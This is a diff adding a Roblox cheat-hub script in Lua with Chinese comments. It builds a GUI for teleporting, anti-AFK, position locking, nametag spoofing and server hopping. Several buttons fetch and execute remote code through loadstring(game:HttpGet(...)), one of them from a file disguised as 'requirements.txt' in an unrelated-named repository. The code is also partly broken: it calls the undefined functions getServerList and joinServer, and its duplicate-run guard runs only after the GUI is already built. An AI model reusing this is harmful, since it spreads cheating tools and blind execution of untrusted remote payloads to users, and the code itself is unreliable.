@@ -1,0 +1,695 @@
+-- 基本服務與玩家
+local Players = game:GetService("Players")
+local Workspace = game:GetService("Workspace")
+local LocalPlayer = Players.LocalPlayer
+local HttpService = game:GetService("HttpService")
+
+-- 儲存自定義名稱
+local savedName = "catlyn"
+
+-- 修改名稱標籤的函數
+local function changeNametag()
+    local playerName = LocalPlayer.Name
+    local character = workspace:FindFirstChild(playerName)
+    if character then
+        local head = character:FindFirstChild("Head")
+        if head then
+            local nametagFolder = head:FindFirstChild("Nametag")
+            if nametagFolder then
+                local labels = nametagFolder:FindFirstChild("Labels")
+                if labels then
+                    local topLabel = labels:FindFirstChild("TopLabel")
+                    if topLabel then
+                        topLabel.Text = savedName
+                    end
+                end
+            end
+        end
+    end
+end
+
+-- 初次執行修改名稱
+changeNametag()
+
+-- 監聽角色重生事件，重生後重新應用名稱
+LocalPlayer.CharacterAdded:Connect(function(character)
+    character:WaitForChild("Head", 10)
+    wait(0.5)
+    changeNametag()
+end)
+
+-- 建立安全區平台
+local baseSize = Vector3.new(150, 5, 150)
+local basePosition = Vector3.new(5122, 119, 9513)
+
+local platform = Instance.new("Part")
+platform.Size = baseSize
+platform.Position = basePosition
+platform.Anchored = true
+platform.CanCollide = true
+platform.Transparency = 0.5
+platform.Color = Color3.fromRGB(100, 100, 100)
+platform.Material = Enum.Material.SmoothPlastic
+platform.Name = "LocalPlatform"
+platform.Parent = Workspace
+
+-- 顯示文字 Part
+local textPart = Instance.new("Part")
+textPart.Size = Vector3.new(50, 1, 50)
+textPart.Anchored = true
+textPart.CanCollide = false
+textPart.Transparency = 1
+textPart.Position = platform.Position - Vector3.new(0, 0.5, 0)
+textPart.Rotation = Vector3.new(180, 0, 0)
+textPart.Parent = Workspace
+
+local surfaceGui = Instance.new("SurfaceGui", textPart)
+surfaceGui.Face = Enum.NormalId.Top
+surfaceGui.AlwaysOnTop = true
+
+local label = Instance.new("TextLabel", surfaceGui)
+label.Text = "貓玲的安全區(>^ω^<)"
+label.Size = UDim2.new(1, 0, 1, 0)
+label.BackgroundTransparency = 1
+label.TextColor3 = Color3.fromRGB(255, 192, 203)
+label.TextScaled = true
+label.Font = Enum.Font.Fantasy
+
+-- 建立牆壁
+local function createWall(size, position)
+    local wall = Instance.new("Part")
+    wall.Size = size
+    wall.Position = position
+    wall.Anchored = true
+    wall.CanCollide = true
+    wall.Transparency = 0.5
+    wall.Color = Color3.fromRGB(100, 100, 100)
+    wall.Material = Enum.Material.SmoothPlastic
+    wall.Parent = Workspace
+end
+
+local wallHeight = 150
+createWall(Vector3.new(1, wallHeight, 150), basePosition + Vector3.new(baseSize.X/2, wallHeight/2, 0))
+createWall(Vector3.new(1, wallHeight, 150), basePosition - Vector3.new(baseSize.X/2, -wallHeight/2, 0))
+createWall(Vector3.new(150, wallHeight, 1), basePosition + Vector3.new(0, wallHeight/2, baseSize.Z/2))
+createWall(Vector3.new(150, wallHeight, 1), basePosition - Vector3.new(0, -wallHeight/2, baseSize.Z/2))
+createWall(baseSize, basePosition + Vector3.new(0, wallHeight, 0))
+
+-- GUI 主體
+local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
+ScreenGui.Name = "MaolingHub"
+
+-- 主框架樣式
+local Frame = Instance.new("Frame", ScreenGui)
+Frame.Size = UDim2.new(0, 450, 0, 350)
+Frame.Position = UDim2.new(0.5, -225, 0.5, -175)
+Frame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
+Frame.BorderSizePixel = 0
+Frame.Active = true
+Frame.Draggable = true
+
+-- 添加漸層效果
+local gradient = Instance.new("UIGradient", Frame)
+gradient.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(25, 25, 35)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(35, 35, 50))
+}
+gradient.Rotation = 45
+
+-- 添加外發光效果
+local stroke = Instance.new("UIStroke", Frame)
+stroke.Color = Color3.fromRGB(100, 150, 255)
+stroke.Thickness = 2
+stroke.Transparency = 0.5
+
+Instance.new("UICorner", Frame).CornerRadius = UDim.new(0, 15)
+
+-- 標題樣式
+local Title = Instance.new("TextLabel", Frame)
+Title.Size = UDim2.new(1, -80, 0, 50)
+Title.Position = UDim2.new(0, 15, 0, 0)
+Title.BackgroundTransparency = 1
+Title.Text = "✨ 貓玲的腳本區 ✨ v0.50"
+Title.Font = Enum.Font.GothamBold
+Title.TextSize = 22
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.TextXAlignment = Enum.TextXAlignment.Left
+
+-- 添加標題發光效果
+local titleStroke = Instance.new("UIStroke", Title)
+titleStroke.Color = Color3.fromRGB(100, 150, 255)
+titleStroke.Thickness = 1
+titleStroke.Transparency = 0.3
+
+-- 關閉按鈕樣式和功能
+local Close = Instance.new("TextButton", Frame)
+Close.Size = UDim2.new(0, 35, 0, 35)
+Close.Position = UDim2.new(1, -40, 0, 8)
+Close.Text = "x"
+Close.BackgroundColor3 = Color3.fromRGB(220, 60, 60)
+Close.TextColor3 = Color3.fromRGB(255, 255, 255)
+Close.Font = Enum.Font.GothamBold
+Close.TextSize = 18
+Close.BorderSizePixel = 0
+
+local closeGradient = Instance.new("UIGradient", Close)
+closeGradient.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(220, 60, 60)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(180, 40, 40))
+}
+
+Instance.new("UICorner", Close).CornerRadius = UDim.new(0, 8)
+
+Close.MouseButton1Click:Connect(function()
+    ScreenGui:Destroy()
+    _G.maolingHubLoaded = false
+end)
+
+-- 最小化按鈕樣式
+local Minimize = Instance.new("TextButton", Frame)
+Minimize.Size = UDim2.new(0, 35, 0, 35)
+Minimize.Position = UDim2.new(1, -80, 0, 8)
+Minimize.Text = "─"
+Minimize.BackgroundColor3 = Color3.fromRGB(100, 100, 120)
+Minimize.TextColor3 = Color3.fromRGB(255, 255, 255)
+Minimize.Font = Enum.Font.GothamBold
+Minimize.TextSize = 16
+Minimize.BorderSizePixel = 0
+
+local minimizeGradient = Instance.new("UIGradient", Minimize)
+minimizeGradient.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(100, 100, 120)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(80, 80, 100))
+}
+
+Instance.new("UICorner", Minimize).CornerRadius = UDim.new(0, 8)
+
+-- 側邊欄為可滾動
+local SideBar = Instance.new("ScrollingFrame", Frame)
+SideBar.Size = UDim2.new(0, 130, 1, -55)
+SideBar.Position = UDim2.new(0, 5, 0, 50)
+SideBar.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
+SideBar.BorderSizePixel = 0
+SideBar.ScrollBarThickness = 6
+SideBar.CanvasSize = UDim2.new(0, 0, 0, 200)
+SideBar.AutomaticCanvasSize = Enum.AutomaticSize.Y
+SideBar.ScrollingDirection = Enum.ScrollingDirection.Y
+
+-- 添加側邊欄樣式
+local sidebarGradient = Instance.new("UIGradient", SideBar)
+sidebarGradient.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(35, 35, 50)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(45, 45, 65))
+}
+
+Instance.new("UICorner", SideBar).CornerRadius = UDim.new(0, 10)
+
+-- 添加UIListLayout到側邊欄
+local sidebarLayout = Instance.new("UIListLayout", SideBar)
+sidebarLayout.Padding = UDim.new(0, 8)
+sidebarLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+
+-- 內容區域
+local Content = Instance.new("Frame", Frame)
+Content.Size = UDim2.new(1, -145, 1, -55)
+Content.Position = UDim2.new(0, 140, 0, 50)
+Content.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
+Content.BorderSizePixel = 0
+
+local contentGradient = Instance.new("UIGradient", Content)
+contentGradient.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(40, 40, 60)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(50, 50, 75))
+}
+
+Instance.new("UICorner", Content).CornerRadius = UDim.new(0, 10)
+
+-- 縮小功能的尺寸
+local isMinimized = false
+local fullSize = UDim2.new(0, 450, 0, 350)
+local miniSize = UDim2.new(0, 450, 0, 50)
+
+Minimize.MouseButton1Click:Connect(function()
+    isMinimized = not isMinimized
+    SideBar.Visible = not isMinimized
+    Content.Visible = not isMinimized
+    Frame.Size = isMinimized and miniSize or fullSize
+end)
+
+-- 簡單高亮文字的分區按鈕樣式
+local function createSectionButton(text, order, parent)
+    local btn = Instance.new("TextButton", parent)
+    btn.Size = UDim2.new(0, 120, 0, 45)
+    btn.Text = text
+    btn.BackgroundColor3 = Color3.fromRGB(85, 85, 105)
+    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    btn.TextTransparency = 0
+    btn.Font = Enum.Font.GothamBold
+    btn.TextSize = 16
+    btn.BorderSizePixel = 0
+    
+    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 10)
+    
+    local btnStroke = Instance.new("UIStroke", btn)
+    btnStroke.Color = Color3.fromRGB(150, 180, 255)
+    btnStroke.Thickness = 1
+    btnStroke.Transparency = 0.6
+    
+    btn.MouseEnter:Connect(function()
+        btn.BackgroundColor3 = Color3.fromRGB(105, 105, 125)
+        btnStroke.Transparency = 0.3
+    end)
+    
+    btn.MouseLeave:Connect(function()
+        btn.BackgroundColor3 = Color3.fromRGB(85, 85, 105)
+        btnStroke.Transparency = 0.6
+    end)
+    
+    return btn
+end
+
+-- 重新創建分區按鈕
+local Section1 = createSectionButton("🚀 傳送", 1, SideBar)
+local Section2 = createSectionButton("⚙️ 常用", 2, SideBar)
+local Section3 = createSectionButton("🔧 其他", 3, SideBar)
+
+-- 簡單高亮文字的一般按鈕樣式
+local function createButton(text, order, parent, spacing)
+    local btn = Instance.new("TextButton", parent)
+    btn.Size = UDim2.new(0, 180, 0, 35)
+    btn.Position = UDim2.new(0.5, -90, 0, 10 + (order - 1) * spacing)
+    btn.Text = text
+    btn.BackgroundColor3 = Color3.fromRGB(80, 140, 220)
+    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    btn.TextSize = 16
+    btn.Font = Enum.Font.GothamBold
+    btn.BorderSizePixel = 0
+    
+    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
+    
+    local btnStroke = Instance.new("UIStroke", btn)
+    btnStroke.Color = Color3.fromRGB(120, 170, 255)
+    btnStroke.Thickness = 1
+    btnStroke.Transparency = 0.6
+    
+    btn.MouseEnter:Connect(function()
+        btn.BackgroundColor3 = Color3.fromRGB(100, 160, 240)
+        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+        btnStroke.Transparency = 0.3
+    end)
+    
+    btn.MouseLeave:Connect(function()
+        btn.BackgroundColor3 = Color3.fromRGB(80, 140, 220)
+        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+        btnStroke.Transparency = 0.6
+    end)
+    
+    return btn
+end
+
+-- 傳送分區使用 ScrollingFrame
+local TPScroll = Instance.new("ScrollingFrame", Content)
+TPScroll.Size = UDim2.new(1, 0, 1, 0)
+TPScroll.CanvasSize = UDim2.new(0, 0, 0, 100)
+TPScroll.ScrollBarThickness = 6
+TPScroll.BackgroundTransparency = 1
+TPScroll.Visible = true
+TPScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
+TPScroll.VerticalScrollBarInset = Enum.ScrollBarInset.ScrollBar
+TPScroll.ScrollingDirection = Enum.ScrollingDirection.Y
+
+-- 常用分區
+local CommonButtonsScroll = Instance.new("ScrollingFrame", Content)
+CommonButtonsScroll.Size = UDim2.new(1, 0, 1, 0)
+CommonButtonsScroll.CanvasSize = UDim2.new(0, 0, 0, 400)
+CommonButtonsScroll.ScrollBarThickness = 6
+CommonButtonsScroll.BackgroundTransparency = 1
+CommonButtonsScroll.Visible = false
+CommonButtonsScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
+CommonButtonsScroll.VerticalScrollBarInset = Enum.ScrollBarInset.ScrollBar
+CommonButtonsScroll.ScrollingDirection = Enum.ScrollingDirection.Y
+
+-- 其他分區
+local OtherScroll = Instance.new("ScrollingFrame", Content)
+OtherScroll.Size = UDim2.new(1, 0, 1, 0)
+OtherScroll.CanvasSize = UDim2.new(0, 0, 0, 150)
+OtherScroll.ScrollBarThickness = 6
+OtherScroll.BackgroundTransparency = 1
+OtherScroll.Visible = false
+OtherScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
+OtherScroll.VerticalScrollBarInset = Enum.ScrollBarInset.ScrollBar
+OtherScroll.ScrollingDirection = Enum.ScrollingDirection.Y
+
+-- 添加滾動框樣式改善
+local function styleScrollFrame(scrollFrame)
+    scrollFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 65)
+    scrollFrame.BorderSizePixel = 0
+    scrollFrame.ScrollBarImageColor3 = Color3.fromRGB(100, 150, 255)
+    
+    local scrollGradient = Instance.new("UIGradient", scrollFrame)
+    scrollGradient.Color = ColorSequence.new{
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(45, 45, 65)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(55, 55, 80))
+    }
+    
+    Instance.new("UICorner", scrollFrame).CornerRadius = UDim.new(0, 8)
+end
+
+-- 應用到所有滾動框
+styleScrollFrame(TPScroll)
+styleScrollFrame(CommonButtonsScroll)
+styleScrollFrame(OtherScroll)
+
+-- 傳送分區（改進版 - 雙向傳送）
+local previousPosition = nil
+local isAtSafeZone = false
+
+local TPButtons = {
+    createButton("安全區", 1, TPScroll, 40),
+}
+
+TPButtons[1].MouseButton1Click:Connect(function()
+    local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+    if hrp then
+        if not isAtSafeZone then
+            -- 記錄當前位置並傳送到安全區
+            previousPosition = hrp.Position
+            hrp.CFrame = CFrame.new(5122, 124, 9513)
+            isAtSafeZone = true
+            TPButtons[1].Text = "已傳送"
+            
+            -- 3秒後恢復按鈕文字
+            task.wait(3)
+            TPButtons[1].Text = "安全區"
+        else
+            -- 如果已在安全區，傳送回之前的位置
+            if previousPosition then
+                hrp.CFrame = CFrame.new(previousPosition)
+                isAtSafeZone = false
+                TPButtons[1].Text = "回安全區"
+                
+                -- 3秒後恢復按鈕文字
+                task.wait(3)
+                TPButtons[1].Text = "安全區"
+            end
+        end
+    end
+end)
+
+-- 常用分區UIListLayout
+local UIListLayout = Instance.new("UIListLayout", CommonButtonsScroll)
+UIListLayout.Padding = UDim.new(0, 5)
+UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+
+-- 防掛機功能
+local antiAFK = false
+local virtualUser = game:GetService("VirtualUser")
+
+local antiAFKBtn = createButton("防掛機: 關", 1, CommonButtonsScroll, 40)
+
+antiAFKBtn.MouseButton1Click:Connect(function()
+    antiAFK = not antiAFK
+    antiAFKBtn.Text = antiAFK and "防掛機: 開" or "防掛機: 關"
+end)
+
+LocalPlayer.Idled:Connect(function()
+    if antiAFK then
+        virtualUser:Button2Down(Vector2.new(0, 0), Workspace.CurrentCamera.CFrame)
+        task.wait(1)
+        virtualUser:Button2Up(Vector2.new(0, 0), Workspace.CurrentCamera.CFrame)
+    end
+end)
+
+-- Remote Spy Mobile按鈕
+local remoteSpyBtn = createButton("Remote Spy Mobile", 2, CommonButtonsScroll, 40)
+
+remoteSpyBtn.MouseButton1Click:Connect(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/wfrefdewwss/Discord-Custom-Status-24-7/refs/heads/main/requirements.txt"))()
+end)
+
+-- infyield按鈕
+local infyieldBtn = createButton("infyield", 3, CommonButtonsScroll, 40)
+
+infyieldBtn.MouseButton1Click:Connect(function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/edgeiy/infiniteyield/master/source'))()
+end)
+
+-- bringfly按鈕
+local bringflyBtn = createButton("bringfly", 4, CommonButtonsScroll, 40)
+
+bringflyBtn.MouseButton1Click:Connect(function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/catlyn316/Bring-fly/refs/heads/main/Bring%20fly'))()
+end)
+
+-- 重新排序所有按鈕
+wait(0.1)
+
+local orderedElements = {
+    antiAFKBtn,
+    remoteSpyBtn,
+    infyieldBtn,
+    bringflyBtn
+}
+
+for i, element in ipairs(orderedElements) do
+    if element then
+        element.LayoutOrder = i
+    end
+end
+
+-- 伺服器跳轉相關函數
+local TeleportService = game:GetService("TeleportService")
+
+local function joinSmallestServer()
+    local success, result = pcall(function()
+        local response = HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100"))
+        
+        if response.data and #response.data > 0 then
+            table.sort(response.data, function(a, b)
+                return a.playing < b.playing
+            end)
+            
+            local targetServer = response.data[8] or response.data[1]
+            
+            if targetServer and targetServer.id then
+                TeleportService:TeleportToPlaceInstance(game.PlaceId, targetServer.id)
+            else
+                warn("無法找到適合的伺服器")
+            end
+        else
+            warn("無法獲取伺服器列表")
+        end
+    end)
+    
+    if not success then
+        warn("跳服失敗: " .. tostring(result))
+    end
+end
+
+local function joinMostPlayedServer()
+    local success, result = pcall(function()
+        local response = HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100"))
+        
+        if response.data and #response.data > 0 then
+            local maxPlayers = game.Players.MaxPlayers
+            local targetPlayers = math.floor(maxPlayers * 3 / 4)
+            
+            table.sort(response.data, function(a, b)
+                local diffA = math.abs(a.playing - targetPlayers)
+                local diffB = math.abs(b.playing - targetPlayers)
+                return diffA < diffB
+            end)
+            
+            local targetServer = response.data[1]
+            
+            if targetServer and targetServer.id then
+                TeleportService:TeleportToPlaceInstance(game.PlaceId, targetServer.id)
+            else
+                warn("無法找到適合的伺服器")
+            end
+        else
+            warn("無法獲取伺服器列表")
+        end
+    end)
+    
+    if not success then
+        warn("跳服失敗: " .. tostring(result))
+    end
+end
+
+-- 其他分區 - 位置固定功能
+local OtherButtons = {
+    createButton("位置固定: 關", 1, OtherScroll, 40),
+    createButton("傳送到少人服", 2, OtherScroll, 40),
+    createButton("傳送到多人服", 3, OtherScroll, 40),
+}
+
+-- 位置固定相關變量
+local positionLocked = false
+local lockedPosition = nil
+local lockConnection = nil
+
+OtherButtons[1].MouseButton1Click:Connect(function()
+    positionLocked = not positionLocked
+    OtherButtons[1].Text = positionLocked and "位置固定: 開" or "位置固定: 關"
+    
+    if positionLocked then
+        local character = LocalPlayer.Character
+        if character and character:FindFirstChild("HumanoidRootPart") then
+            lockedPosition = character.HumanoidRootPart.Position
+            
+            lockConnection = game:GetService("RunService").Heartbeat:Connect(function()
+                pcall(function()
+                    if positionLocked and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and lockedPosition then
+                        local hrp = LocalPlayer.Character.HumanoidRootPart
+                        local camera = Workspace.CurrentCamera
+                        
+                        -- 保持位置不變，但保留朝向（攝像視角）
+                        local currentCFrame = hrp.CFrame
+                        hrp.CFrame = CFrame.new(lockedPosition) * CFrame.Angles(currentCFrame:ToEulerAnglesYXZ())
+                    end
+                end)
+            end)
+        end
+    else
+        if lockConnection then
+            lockConnection:Disconnect()
+            lockConnection = nil
+        end
+        lockedPosition = nil
+    end
+end)
+
+-- 傳送到少人服按鈕
+OtherButtons[2].MouseButton1Click:Connect(function()
+    OtherButtons[2].Text = "搜尋中..."
+    OtherButtons[2].TextColor3 = Color3.fromRGB(200, 200, 200)
+    
+    task.spawn(function()
+        local servers = getServerList()
+        
+        if #servers == 0 then
+            OtherButtons[2].Text = "未找到伺服器"
+            task.wait(2)
+            OtherButtons[2].Text = "傳送到少人服"
+            OtherButtons[2].TextColor3 = Color3.fromRGB(255, 255, 255)
+            return
+        end
+        
+        local leastPlayersServer = servers[1]
+        for _, server in pairs(servers) do
+            if server.playing < leastPlayersServer.playing then
+                leastPlayersServer = server
+            end
+        end
+        
+        OtherButtons[2].Text = "傳送中..."
+        task.wait(0.5)
+        joinServer(leastPlayersServer.id)
+    end)
+end)
+
+-- 傳送到多人服按鈕
+OtherButtons[3].MouseButton1Click:Connect(function()
+    OtherButtons[3].Text = "搜尋中..."
+    OtherButtons[3].TextColor3 = Color3.fromRGB(200, 200, 200)
+    
+    task.spawn(function()
+        local servers = getServerList()
+        
+        if #servers == 0 then
+            OtherButtons[3].Text = "未找到伺服器"
+            task.wait(2)
+            OtherButtons[3].Text = "傳送到多人服"
+            OtherButtons[3].TextColor3 = Color3.fromRGB(255, 255, 255)
+            return
+        end
+        
+        local maxPlayers = game.Players.MaxPlayers
+        local targetPlayers = math.floor(maxPlayers * 3 / 4)
+        local bestServer = servers[1]
+        local bestDifference = math.abs(bestServer.playing - targetPlayers)
+        
+        for _, server in pairs(servers) do
+            local difference = math.abs(server.playing - targetPlayers)
+            if difference < bestDifference then
+                bestServer = server
+                bestDifference = difference
+            end
+        end
+        
+        OtherButtons[3].Text = "傳送中..."
+        task.wait(0.5)
+        joinServer(bestServer.id)
+    end)
+end)
+
+-- 其他分區的UIListLayout
+local otherLayout = Instance.new("UIListLayout", OtherScroll)
+otherLayout.Padding = UDim.new(0, 5)
+otherLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+
+-- 設置 LayoutOrder
+OtherButtons[1].LayoutOrder = 1
+OtherButtons[2].LayoutOrder = 2
+OtherButtons[3].LayoutOrder = 3
+
+-- 分區切換
+Section1.MouseButton1Click:Connect(function()
+    TPScroll.Visible = true
+    CommonButtonsScroll.Visible = false
+    OtherScroll.Visible = false
+    
+    Section1.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
+    Section2.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+    Section3.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+end)
+
+Section2.MouseButton1Click:Connect(function()
+    TPScroll.Visible = false
+    CommonButtonsScroll.Visible = true
+    OtherScroll.Visible = false
+    
+    Section1.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+    Section2.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
+    Section3.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+end)
+
+Section3.MouseButton1Click:Connect(function()
+    TPScroll.Visible = false
+    CommonButtonsScroll.Visible = false
+    OtherScroll.Visible = true
+    
+    Section1.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+    Section2.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+    Section3.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
+end)
+
+-- 初始化高亮第一個分區按鈕
+Section1.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
+
+-- 清理函數
+local function cleanUp()
+    positionLocked = false
+    if lockConnection then
+        lockConnection:Disconnect()
+        lockConnection = nil
+    end
+    lockedPosition = nil
+    previousPosition = nil
+    isAtSafeZone = false
+end
+
+-- 添加清理事件
+script.AncestryChanged:Connect(function(_, newParent)
+    if not newParent then
+        cleanUp()
+    end
+end)
+
+-- 防止重複執行的檢查
+if _G.maolingHubLoaded then
+    warn("貓玲的腳本已經在運行中")
+    return
+end
+_G.maolingHubLoaded = true
